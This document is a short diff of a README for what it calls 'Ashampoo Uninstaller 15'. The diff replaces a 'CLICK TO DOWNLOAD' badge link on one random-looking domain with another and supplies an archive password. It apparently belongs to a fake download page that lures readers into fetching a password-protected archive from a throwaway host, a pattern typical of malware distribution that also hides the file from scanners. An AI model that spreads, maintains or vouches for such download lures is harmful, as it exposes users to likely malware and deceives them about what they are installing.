@@ -1,6 +1,6 @@
 # Ashampoo Uninstaller 15
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/Ashampoo-Uninstaller-15-Desktop)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://fghtfghjfdjfdj.com/Ashampoo-Uninstaller-15-Desktop)
 > #### Archive password: `2026`
 
 
